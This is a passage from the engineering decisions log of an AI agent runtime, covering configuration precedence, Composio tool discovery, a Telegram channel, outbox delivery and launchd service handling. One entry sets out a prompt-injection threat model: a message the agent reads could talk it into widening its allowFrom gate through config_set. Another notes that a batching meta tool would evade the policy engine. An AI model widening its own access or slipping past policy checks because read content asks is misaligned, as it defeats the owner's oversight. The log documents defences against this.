  deliberate — an operator's export has to win, or a container cannot configure the agent it runs —
  but it silently changed which model a sandbox agent ran on, because the binary was launched from a
  project checkout whose own `.env` set `MODEL_ID`. The banner reported the model in use, which is
  correct and useless to someone who has just written a different one two minutes earlier. This
  contamination was already recorded as a *test* hazard, which is exactly how it stayed invisible as a
  runtime one: a hazard filed under "tests" is a hazard nobody looks for in production.
- **Precedence is export → the agent's own `.env` → a `.env` in the cwd, and the last step is CLI
  policy.** `cli/lib/ambient.ts` demotes a cwd variable before core sees an environment at all; core's
  "real environment wins" is untouched, because an embedder's container must keep winning with none of
  this. It was reported twice before being fixed, which is the lesson: a warning explained the
  surprise and did not remove it. The known wrong case — an export byte-identical to the cwd file's
  value, indistinguishable from inside the process — is documented in the module.
- **Every capability the runtime has is a question in `init`.** Standing directive from Moeen after
  the web provider shipped generated-but-commented. A capability reachable only by someone who
  already knows the field names is a capability the generated file is hiding. `fetch` and `search`
  are separate answers because their costs differ: one needs no account anywhere, the other needs a
  third-party key. When a new provider lands, it gets a question, a flag, and an entry in
  `WEB_CHOICES`-shaped table — not a commented block.
- **Only secrets go through `${VAR}`; a generated manifest writes the model id and base URL
  literally.** A model name is not a secret, and hard rule 10 governs secrets. Behind a variable the
  id cost three things: `readManifestHeader` does not expand — deliberately, so a listing never needs
  credentials — so every sandbox agent listed as `${MODEL_ID}` and the picker could not tell two
  apart; any `.env` on the machine changed the model *and* the resolved `contextWindow`, `thinking`
  and `promptStyle`, all derived from the id; and `validate` checked whichever agent the environment
  described. Expansion still works — it is just not what a generated file should reach for when the
  value is a fact about that agent. Corollary: **before putting a field behind a variable, check
  whether anything reads it unexpanded.**
  The exception is `examples/minimal`, which keeps `${MODEL_ID}` because demonstrating one manifest
  against four endpoints *is* its purpose — and it says so in the file. Read the cost from the other
  side too: with a literal, `MODEL_ID=x <binary> run` overrides nothing, which is exactly the
  no-silent-drift property and is why there is no ad-hoc override for a real agent.
- **`context.reserveOutput` budgets the prompt; `model.<role>.maxTokens` caps the endpoint. They are
  not the same number and must never be wired together again.** Reserve fed `max_tokens` for three
  phases, so a budgeting figure became a hard truncation — and on a reasoning model the truncation
  lands on the thinking, which is how qwen3.5:9b returned **empty content** against an 8,192 limit
  nobody chose. `max_tokens` is now absent from the wire unless configured. When a reply comes back
  empty at `finish_reason: length`, read the message: it names whether the limit was ours or the
  endpoint's, and says "no usage reported" rather than printing a contradictory "0 spent".
- **Reasoning streams to the screen by default when `capabilities.thinking !== "none"`.** Opt-in was
  wrong: it made a reasoning model look hung for thirty seconds while the only available signal was
  being generated and discarded. Resolved once in `run.ts` and narrowed to a required boolean on
  `Wired`, so no renderer decides it a second time.
- **Every context slot is framed except the one that was not, and that was the bug.** The static
  tier reads as a document, slot 1 opens with `# Tools`, untrusted output arrives fenced and
  labelled — and the volatile tier, whose whole job is *what you know about the person you work
  for*, arrived as a bare paragraph. A fresh agent with "Moeen is the person I work for" in its
  context answered "No, I can't read your name. Each session starts fresh." `VOLATILE_HEADER` fixes
  it, and the general rule is the useful part: **a fact with no frame is a fact a small model will
  not connect to a question.** Framing is structure and is allowed; rewriting an authored sentence
  is decision 4.19 and is not.
- **`bun run build` must build every package the binary imports, and for three phases it did not.**
  It built `core` and `cli`; the CLI imports `tools-system`, `tools-web` and `tools-composio` from
  their `dist`. So a provider change was invisible to the binary until someone rebuilt that package
  by hand, and the symptom is the worst kind — the new code is right, the test fails, and the stack
  trace points into a `dist` that still holds the old version. Recorded for `core` already; it was
  never a `core` property.
- **A provider reports an unresolved slug through `explainUnresolved()`, and never throws from
  `resolve()`.** The registry hands *every* provider the whole `pinned` list, so a cold Composio is
  asked about `config_read` and cannot know the system provider is about to answer for it. Throwing
  there refused a correct manifest with "2 pinned Composio tools are not in the resolution cache:
  config_read, config_set" — wrong in both halves. Both principles hold and neither is sufficient
  alone: omit what you do not know, *and* only the provider knows an empty cache is the reason
  rather than a typo. The provider supplies the sentence; the registry asks for it only once a slug
  is missing everywhere. Silent once the cache holds anything — past the first warm it really is a
  typo, and nearest-match is the better message.
- **Name a disabled provider when it can tell the model what it lacks; document it when it cannot.**
  `web: {}` is named while switched off because that is what makes `available()` run. Composio was
  the exception — a 25,000-tool catalogue has nothing useful to list — until the meta tools gave it
  two fixed entries, and it is now named like the others. The rule outlived the exception, which is
  the point: it is about what `available()` can *say*, not about the provider.
- **`tools --warm` refreshes the slugs already in `pinned`, so it can never discover one.** A slug
  had to be known before it could be warmed and warmed before it could be pinned, and the only way
  in was composio.dev in a browser. Nothing said so, and an agent asked to connect a Gmail account
  spent 4,417 output tokens finding out. `composio_search` is the way in now; `--warm` is still
  right for a slug someone typed in by hand.
- **Composio's router is for discovery; schemas come from `GET /tools/{slug}`.** Every router-side
  schema surface is thin — `tool_schemas` in a search result *and* `COMPOSIO_GET_TOOL_SCHEMAS* both
  return `tool_slug` for `slug`, `input_schema` for `input_parameters`, and **no `tags` at all**.
  Caching one fails three ways silently: a pinned tool reaches the model with **no arguments**;
  everything is assumed mutating for want of a `readOnlyHint`, so reading your own inbox serialises
  and holds a write slot; and the map does not reliably hold every slug the same response
  recommends. The first live search tagged all eight hits "(changes things)", `OUTLOOK_GET_MAIL_TIPS`
  included.
- **A discovered tool becomes a pinned tool, never an executed one.** `composio_search` finds a slug
  and caches its schema, `config_set` writes it into `tools.pinned`, and a restart makes it ordinary
  — one hop, phase-scopable. That is why there is no `composio_execute(slug, args)`: it would make
  every Composio task two-hop forever, which is what decision 4.7 refuses. Discovery is setup and
  setup happens once, at a moment the person is already pausing to click an OAuth link.
- **A meta tool that puts tool calls inside its own arguments is a hole, not a convenience.**
  `COMPOSIO_MULTI_EXECUTE_TOOL` is not shipped for the same reason `exec` has no `env` map and
  `memory_write` no file argument: the policy engine matches a tool plus a policy arg, and a batch
  is invisible to it. `composio_connect` carries `policyArg: "toolkit"` so `deny
  composio_connect(slack)` is expressible. The live session exposes six meta tools, not the four the
  docs list — the extra two are a remote bash and a schema fetcher.
- **A test that backgrounds a process must kill it, and `exec` must reap what it backgrounds.** One
  test left `while true; do :; done` running on every run; a day of runs put **33 orphaned shells**
  on the machine at ~23% CPU each, a load average of **351**, and a `runtime.ready` of **132
  seconds** — the boot budget, blown by the runtime's own litter, with nothing obviously wrong. The
  runtime leak was the same bug: `unref()` is not reaping. There is now a registry, a cap of 8, and
  `ToolProvider.stop()`, which `Runtime.stop` calls. Kill by process *group* — `sh -c "a | b | c"`
  killed by pid orphans two of three.
- **A slow boot is a symptom before it is a bug.** `ready in 132647 ms` and an earlier `ready in
  100339 ms` were both the machine being saturated, not the runtime being slow. `bench:boot` passes
  at 27 ms on an idle machine. Check `uptime` before profiling.
- **Slot 2 reports runtime state, not the manifest.** An agent told "channels: tg (telegram)" while
  running under `run` concluded the Telegram runtime had died and reported that nothing was
  listening on 7420 — from inside the running process. Every statement was true of the manifest and
  false of the moment. It is rendered lazily and frozen at first use, because channels start later
  inside `Runtime.create` and the port binds after it returns; `reportRuntimeState` throws if called
  after that, since slot 2 is in the cache-stable prefix.
- **An NLT field name has no spaces.** The class used to be `[\w .-]`, so any continuation line of a
  multi-line value containing a colon became a new field: `lsof -nP -iTCP:7420` parsed as the field
  `lsof -nP -iTCP`. A shell script is the normal value for `exec` and colons are everywhere in one.
- **The agent's own configuration is slot 2, injected — never left to `config_read`.** Knowing how
  you are set up was two-hop reasoning, which is what decision 4.7 refuses for tool discovery, and
  it fails harder here: a model that does not know a setting *exists* has no reason to look for it.
  Measured — an agent asked to put itself on Telegram, with `config_set` pinned, `config_set` in
  `policy.allow`, and a commented-out `channels` block in its own manifest, proposed Composio and
  then **started writing a Telegram bridge**. Every piece worked; none was reachable. The block
  names an absent capability as `none` rather than omitting it, because a missing row reads as "no
  such concept" and a `none` row reads as a switch that is off. Anything the runtime can be
  configured to do belongs in it — one row, not a new special case.
- **Enabling a capability is the agent's; who and where are the person's.** `config_set` may write
  `channels`, `delivery`, `server.enabled` and `server.port` — skipping a question in `init` must
  not be a dead end. It may never write `allowFrom`, `server.host`, `server.tokenEnv` or a
  `writeRoots` anywhere. `allowFrom` is the sharpest: it is the inbound gate, so an agent that could
  widen it could be talked into widening it by the message it is reading — and `config_set` is in
  `policy.allow` on a real manifest, so the write gate would not stop that. Floored by path *and* by
  the key hidden inside a value, both shapes.
- **A settable path with a new value *shape* silently writes `[object Object]`.** It happened for a
  map when `tools.providers` became settable, and again for a sequence of maps when `channels` did —
  and a third time in `config_read`'s summary, which stringifies list entries separately. The schema
  then rejects the result with a message pointing nowhere near the cause. Check the renderer whenever
  a new path's value is not a scalar.
- **`.env` is a protected path, so the agent cannot supply its own secrets — and must say so.** A
  `config_set` that names a new `tokenEnv` reports that the agent will not start until the variable
  is filled in. Without that the agent writes a channel, reports success, asks for a restart, and
  the restart fails to load.
- **A commented block's heading must not end in a colon.** `# Phase 4 — channels, delivery, and the
  HTTP server:` became a YAML key the moment someone uncommented the block, and the load failed
  complaining about a heading. The generated manifest's whole premise is that uncommenting works.
- **`serve` reads its token from `loaded.env`, never from `ambientEnv`.** `ambientEnv` returns the
  *process* environment; the agent's own `.env` is layered in by `loadManifest`. Reading the wrong
  one made a token sitting beside the manifest invisible, and the banner said "unauthenticated"
  while the file plainly had it. Every credential in this runtime comes from the manifest's live env.
- **Channels start inside `Runtime.create`, so `serve` passes its own bus in.** A listener attached
  to `runtime.bus` afterwards misses every status they emitted on the way up — the boot-warnings
  trap again. `RuntimeOptions.bus` exists for exactly this.
- **A long-poll holds for 30 seconds, so "connected" comes from `getMe`.** Reporting from the first
  `getUpdates` return left a working bot silent for half a minute, which is indistinguishable from
  a broken one. And do not key "announce once" on `offset === 0`: that stays true until the first
  message *ever* arrives, so an idle bot re-announced every 30 s forever.
- **A disabled channel is never constructed.** `enabled: false` is the one thing that has to work on
  a broken channel; a factory that ran anyway and refused for a missing token would make switching
  one off impossible. Its `type` is still checked.
- **`bun run build` before testing a workspace package from `src`.** Running `packages/cli/src/index.ts`
  still resolves `@castellan/channel-telegram` to its `dist`, so a transport change is invisible until
  that package is rebuilt. Recorded for `core` and the tool packages already; it is a property of
  every workspace dependency, and it cost a confused debugging round here.
- **`Bun.serve`'s `idleTimeout` defaults to 10 seconds and will kill your SSE streams.** The
  heartbeat is 15 s, so the server closed its own event streams before the first keep-alive frame —
  printing `[Bun.serve]: request timed out after 10 seconds` and closing *cleanly*, which a client
  reads as "the turn ended". No test saw it, because a test reads a stream to completion in
  milliseconds. `serve.ts` derives the timeout from `HEARTBEAT_MS` so the two cannot drift, and
  there is now a test that holds an idle stream past the old cutoff. **Run the binary.**
- **`serve` is the only command that starts channels, and `startChannels` decides *whether*, never
  *when*.** `run` builds the same runtime without them: a REPL that quietly began answering Telegram
  while you typed at it would be a surprise, and a one-shot `run --input` that opened a long-poll
  would hang on exit. Nothing connects before `runtime.ready` on either path.
- **A channel `start()` returns once *running*, not once connected.** Awaiting a first successful
  poll would make a Telegram outage an unbootable runtime, and an orchestrator watching `/v1/ready`
  would restart the process into the same outage. `/ready` deliberately flips before channels
  connect; channel state lives on the agent resource. Verified live with an invalid bot token.
- **The Telegram poll loop must never exit on its own.** A loop that throws and returns leaves a
  process that is running, reports nothing, and receives nothing forever. It catches everything,
  backs off, reports on the first failure and every eighth, and only `stop()` ends it. The offset
  advances *before* handling and unconditionally — durability is the outbox's job, not the cursor's.
- **Inbound turns are serialised per session key, and `ChannelHost.receive` never awaits one.** Two
  messages during a turn would otherwise race the same history and append over each other; and a
  poll loop that awaited a 90-second turn is a bot that is deaf for 90 seconds.
- **`TurnStreams.attach` does not create a buffer, and must not learn to.** A caller that starts a
  turn and attaches in the next statement arrives before the first event, so it calls `open(turnId)`
  first. Creating one inside `attach` would make a typo'd turn id indistinguishable from a real one
  and leave the client tailing an empty stream forever.
- **`GET /v1/agents/:id/context` calls `Agent.previewContext`, which calls `assembleContext` with
  the same arguments `send` does.** A server that rebuilt the argument list would answer a question
  about a prompt nothing uses, and would drift the first time a slot moved.
- **A delivery's identity is derived, never generated, and the recipient is part of it.** A UUID at
  enqueue dedupes the outbox against itself — a problem it does not have. The duplicate that happens
  is the *enqueuer* running twice, and only a key both runs can recompute collides. Chunking
  therefore happens at enqueue, not at send: re-splitting later against a different
  `maxMessageChars` produces different keys for the same reply and the collision stops happening.
- **`node:sqlite` truncates a bound string at a NUL byte; `bun:sqlite` stores it whole.** An outbox
  group key built with a NUL separator round-tripped as `tg%3A1` under Node, matched no rows, and
  abandoned no chunks — no error, on one runtime out of two, and `grep` would not even search the
  file because it read as binary. Anything used as a *key* must be printable ASCII. It is row seven
  in `sqlite/driver.ts`'s table and is documented rather than normalised: a NUL in message content
  is still truncated under Node, deliberately, because escaping every bound string on the hot path
  is the wrong price for a byte chat text does not contain.
- **Every timestamp the outbox writes comes from the caller's clock.** `markRetry` always took an
  explicit `nextAttemptAt`; `enqueue` and `recoverInflight` stamped the wall clock while the engine
  asked `due` with an injected one. It never failed — it made tests pass or fail depending on the
  time of day, which for a queue whose whole contract is time is the worst available outcome.
- **Exactly-once is stated per crash point, never as one claim.** Before enqueue, before claim, and
  after `markSent` are all held. The window between the bytes leaving and the acknowledgement
  arriving cannot be closed without the provider deduplicating on a key we supply, which Telegram's
  `sendMessage` has no parameter for. `ChannelLimits.idempotentSend` says which kind of channel it
  is; a recovered row is re-sent, flagged `uncertain`, and that flag rides onto `delivery.sent` so a
  duplicate stays explicable afterwards. Setting the flag true without provider support turns a
  visible ambiguity into a silent duplicate, which is worse.
- **A failed chunk abandons the rest of its message.** `due` withholds any chunk whose predecessor
  is not `sent` — including one that is `failed`, which is the fail-closed direction. Half a message
  reaches a reader with nothing saying the rest is missing. The cascade is one count on one
  `delivery.failed`, because there was one fault.
- **Composio's published reference and its live API disagree, and the live one wins.** The docs
  describe a `summary` with `active_connections`; the response has `{message, results}` and no
  `summary`, with the link at `results.<toolkit>.redirect_url`. A renderer written to the docs
  reports "no link" on a call that returned one — a failure shaped like success. Same lesson one
  layer down: the workbench argument is `code_to_execute`, undocumented, and `code` came back
  "Validation error". Read a field first, walk as a fallback, and verify against the endpoint.

- **Two handlers for one signal means the destructive one wins.** `installGuards` answered SIGTERM
  with `finishNow(EXIT_SIGTERM)` while `serve` registered its own graceful handler; both fired,
  the hard exit won, and `runtime.stop()` never completed — no outbox flush, no clean store close,
  no `provider.stop()`, which is the only reaper for backgrounded `exec` children. Invisible for
  three phases because ctrl-C sends SIGINT, which the guard deliberately ignores, so every
  interactive stop took the right path; SIGTERM is the *only* path a service manager uses. The
  shutdown belongs in the `onExit` teardown list that `finish()` already awaits, and `claimSignals`
  yields the exit code too — a requested stop exits 0, because under `KeepAlive: {Crashed: true}`
  a non-zero exit tells the supervisor to stay down.
- **A fix to a rendering is not a fix to the fact it renders.** Decision 5.17 made slot 2 report
  state, and the *wiring* stayed wrong: `channelsStarted` came from `hub.statusOf(id).length > 0`,
  which is true under `run` as well, since a binding is registered either way and `start()` is what
  differs. So the agent was still being told its channel was connected in a session where nothing
  was listening. Found only by building `/status`, a second consumer of the same fact, and noticing
  the two agreed with each other and disagreed with reality. `hub.started` is the honest signal.
- **A good error message in a file nobody opens is a silent failure.** `~/.openclaw/logs/gateway.err.log`
  is 57 MB of one sentence that names its cause, carries a hint and offers two remedies, written
  every ten seconds for 2,463 restarts. Message quality was never the problem. This is why the
  restart limit is structural — `KeepAlive: {Crashed: true}`, so a configuration fault stops once —
  rather than "we will warn about it", and why `daemon status` exits non-zero and prints the stderr
  tail instead of reporting a stopped job as merely not running.
- **A service is only as durable as the paths baked into it, and `#!/usr/bin/env node` is not one.**
  launchd's PATH is `/usr/bin:/bin:/usr/sbin:/sbin`, which on a machine with a version manager
  contains no `node` — so the obvious plist naming the shim exits 127 forever, into a log nobody
  has been told about. Interpreter and script are both `realpath`'d and written absolutely, the
  manifest too (`resolveAgentRef` is cwd-relative, and launchd's cwd is `/`). Two warnings ride
  along because the paths *can* rot: a binary inside a git checkout, and an interpreter under nvm.
- **`launchctl print` echoes a job's environment in plaintext, so a plist carries no secret.**
  Enforced by a throw in `renderPlist` against a brand-derived allowlist, not by review — the cost
  of getting it wrong is a credential readable by every local process, with nothing about the
  running agent looking wrong. Corollary: `.env` beside the manifest is the *only* credential path
  under a service manager, which is why `init` writes it 0600.
- **`disable` persists across boots; `bootout` does not.** So `daemon stop` is disable + bootout, or
  the agent quietly comes back at the next login — and `install` must `enable` first, or a service
  that was once stopped installs cleanly and silently never starts. Modern verbs only: `bootstrap`,
  `bootout`, `kickstart -k`, `enable`, `disable`, `print`, `print-disabled`. And `launchctl list`'s
  status column is a raw wait status (`256` is exit 1) while `print`'s `last exit code` is already
  decoded — decoding the second turns a failure into a clean stop.
- **`RunAtLoad` starts it; `KeepAlive` starts it *again*.** `KeepAlive: {Crashed: true}` is the
  restart policy and answers nothing about launch, so a plist without `RunAtLoad` installs cleanly,
  runs all day, and silently never comes back at the next login — it loads and waits forever for a
  start condition it does not have. Only observable across a session boundary, which is the test
  easiest to skip. And **`loginwindow`'s pid is the proxy for whether that boundary happened**: every
  LaunchAgent lives in `gui/$UID`, which is torn down with it, so a surviving pid means nothing was
  ever asked to relaunch. `last` and `who` are no use here — they read the same whether a logout was
  cancelled or never attempted, and a logout requested from the terminal running the test cancels
  itself, because Terminal.app with a live child blocks it behind a dialog that times out in 60 s.
- **A stop switch consults two sources, because neither is complete.** `launchctl` knows about
  installed services and nothing about a `serve` started by hand; the lease table knows about any
  live process and nothing about a service that is installed but currently down. `stop` reads both,
  and reporting success while one of them is still running is the only failure it really has. It
  SIGTERMs before it kills — the graceful path is the only one that runs `provider.stop()` and reaps
  backgrounded `exec` children — and it disables as well as unloading, because a safety switch that
  comes back at the next login is not one.
- **A long-running process sets `process.title`, or it is an anonymous `node` in Activity Monitor.**
  `serve` names itself `<slug> <agentId>`, short enough to survive the 16-character `comm`
  truncation intact. The cost is real and worth stating: assigning the title overwrites the argv
  region, so `ps` shows the title instead of the command line — the arguments stay visible through
  `launchctl print` and `daemon status`. It does *not* change the code-signing identity, which is
  Node's, and only shipping our own signed binary would.
- **"Running" and "working" are different questions, and `status` has to answer the second.** A
  freshly installed bot was connected, healthy, and refusing every message from the one person it
  was set up for, because a handle in `allowFrom` had a hyphen where an underscore belonged. The
  refusal names the sender and the exact line to add — into a log file. It is not only *errors*
  that get written where nobody looks, which is the generalisation of the 57 MB lesson.
  `attentionFrom` reads the current run's stdout for up-and-not-working states; scope it to the
  run (slice at the last serving banner) or launchd's appending log reports a fixed problem
  forever.
- **Validate an identifier against the system that issues it, at the moment it is typed.** A
  Telegram username is `[A-Za-z0-9_]{5,32}`, so `@ada-lovelace` cannot exist and matching nobody is
  the only possible outcome. Everything downstream was correct behaviour applied to a wrong fact,
  which is the hardest kind of bug to see: nothing failed anywhere.
- **A lease row is a claim, not a fact, and a dead pid outranks a fresh heartbeat.** A boot that
  fails *after* claiming leaves a row seconds old with no process under it, which blocked every
  retry for ninety seconds while naming a pid that no longer existed — at the moment somebody was
  fixing the fault. Check `process.kill(pid, 0)` first; the heartbeat only settles pid reuse.
  Anything reading a lease to report state must re-check liveness for the same reason.
